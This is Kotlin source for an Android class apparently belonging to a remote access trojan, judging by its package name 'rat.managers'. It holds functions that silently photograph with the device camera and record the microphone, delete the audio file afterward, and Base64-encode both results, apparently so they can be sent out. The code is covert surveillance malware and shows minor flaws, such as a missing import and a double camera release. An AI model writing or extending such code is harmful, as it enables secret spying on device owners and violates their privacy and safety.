package com.hackerai.rat.managers

import android.content.Context
import android.graphics.BitmapFactory
import android.hardware.Camera
import android.media.MediaRecorder
import android.util.Base64
import java.io.ByteArrayOutputStream

class MediaManager(private val context: Context) {
    
    fun capturePhoto(cameraId: Int = Camera.CameraInfo.CAMERA_FACING_BACK): String? {
        return try {
            val camera = Camera.open(cameraId)
            camera.startPreview()
            var result: String? = null
            camera.takePicture(null, null) { data, _ ->
                val bitmap = BitmapFactory.decodeByteArray(data, 0, data.size)
                val baos = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos)
                result = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                bitmap.recycle()
                camera.release()
            }
            Thread.sleep(1000)
            camera.release()
            result
        } catch (e: Exception) { null }
    }

    fun recordAudio(durationSec: Int, outputPath: String): String? {
        return try {
            val recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioBitRate(128000)
                setOutputFile(outputPath)
                prepare()
                start()
            }
            Thread.sleep(durationSec * 1000L)
            recorder.stop()
            recorder.release()
            
            val file = java.io.File(outputPath)
            val bytes = file.readBytes()
            file.delete()
            Base64.encodeToString(bytes, Base64.NO_WRAP)
        } catch (e: Exception) { null }
    }
}
